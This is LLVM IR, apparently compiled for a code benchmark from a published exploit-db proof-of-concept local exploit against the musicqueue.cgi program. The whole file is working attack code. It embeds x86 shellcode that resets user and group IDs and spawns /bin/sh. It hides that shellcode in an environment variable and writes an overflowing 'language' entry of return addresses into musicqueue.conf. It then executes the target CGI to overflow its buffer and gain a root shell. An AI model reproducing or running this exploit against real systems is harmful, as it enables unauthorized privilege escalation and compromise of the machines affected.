; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23303.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23303.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shellcode = private unnamed_addr constant [102 x i8] c"\90@\90@\90@\90@\90@\90@\90@\90@\90@\90@\90@\90@\90@\90@\90@\90@\90@\90@1\C0\B0F1\DB1\C9\CD\801\C0\B0G1\DB1\C9\CD\80\EB\1F^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\08\8DV\0C\CD\801\DB\89\D8@\CD\80\E8\DC\FF\FF\FF/bin/sh\00", align 16
@stdout = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [67 x i8] c"\0A 0x82-musicqueue_over - musicqueue.cgi v-0.9~1.1.1 POC exploit.\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [35 x i8] c" Usage: %s [musicqueue.cgi path]\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"musicqueue.conf\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [38 x i8] c" [-] musicqueue.conf fopen() error.\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"language = %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c"REQUEST_METHOD=GET\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"musicqueue.cgi\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca [3 x i8*], align 16
  %9 = alloca [130 x i8], align 16
  %10 = alloca [102 x i8], align 16
  %11 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %12 = bitcast [102 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([102 x i8], [102 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 102, i1 false)
  %13 = getelementptr inbounds [102 x i8], [102 x i8]* %10, i64 0, i64 0
  %14 = call i64 @strlen(i8* %13)
  %15 = sub i64 3221225471, %14
  store i64 %15, i64* %11, align 8
  %16 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %17 = call i32 @memset(i8* %16, i32 0, i32 130)
  %18 = load i32*, i32** @stdout, align 8
  %19 = call i32 (i32*, i8*, ...) @fprintf(i32* %18, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str, i64 0, i64 0))
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 2
  br i1 %21, label %22, label %29

22:                                               ; preds = %2
  %23 = load i32*, i32** @stdout, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 (i32*, i8*, ...) @fprintf(i32* %23, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0), i8* %26)
  %28 = call i32 @exit(i32 -1) #4
  unreachable

29:                                               ; preds = %2
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32)
  %34 = load i64, i64* %11, align 8
  %35 = sub i64 %34, %33
  store i64 %35, i64* %11, align 8
  br label %36

36:                                               ; preds = %29
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  %39 = sext i32 %37 to i64
  %40 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 %39
  store i8 -126, i8* %40, align 1
  br label %41

41:                                               ; preds = %50, %36
  %42 = load i32, i32* %7, align 4
  %43 = icmp slt i32 %42, 44
  br i1 %43, label %44, label %53

44:                                               ; preds = %41
  %45 = load i64, i64* %11, align 8
  %46 = load i32, i32* %7, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 %47
  %49 = bitcast i8* %48 to i64*
  store i64 %45, i64* %49, align 1
  br label %50

50:                                               ; preds = %44
  %51 = load i32, i32* %7, align 4
  %52 = add nsw i32 %51, 4
  store i32 %52, i32* %7, align 4
  br label %41

53:                                               ; preds = %41
  %54 = call i32* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  store i32* %54, i32** %6, align 8
  %55 = icmp eq i32* %54, null
  br i1 %55, label %56, label %61

56:                                               ; preds = %53
  %57 = load i32, i32* @stderr, align 4
  %58 = sext i32 %57 to i64
  %59 = inttoptr i64 %58 to i32*
  %60 = call i32 (i32*, i8*, ...) @fprintf(i32* %59, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %76

61:                                               ; preds = %53
  %62 = load i32*, i32** %6, align 8
  %63 = getelementptr inbounds [130 x i8], [130 x i8]* %9, i64 0, i64 0
  %64 = call i32 (i32*, i8*, ...) @fprintf(i32* %62, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0), i8* %63)
  %65 = load i32*, i32** %6, align 8
  %66 = call i32 @fclose(i32* %65)
  %67 = getelementptr inbounds [3 x i8*], [3 x i8*]* %8, i64 0, i64 0
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0), i8** %67, align 16
  %68 = getelementptr inbounds [102 x i8], [102 x i8]* %10, i64 0, i64 0
  %69 = getelementptr inbounds [3 x i8*], [3 x i8*]* %8, i64 0, i64 1
  store i8* %68, i8** %69, align 8
  %70 = getelementptr inbounds [3 x i8*], [3 x i8*]* %8, i64 0, i64 2
  store i8* null, i8** %70, align 16
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 1
  %73 = load i8*, i8** %72, align 8
  %74 = getelementptr inbounds [3 x i8*], [3 x i8*]* %8, i64 0, i64 0
  %75 = call i32 @execle(i8* %73, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i64 0, i64 0), i32* null, i8** %74)
  br label %76

76:                                               ; preds = %61, %56
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @strlen(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @fprintf(i32*, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @execle(i8*, i8*, i32*, i8**) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
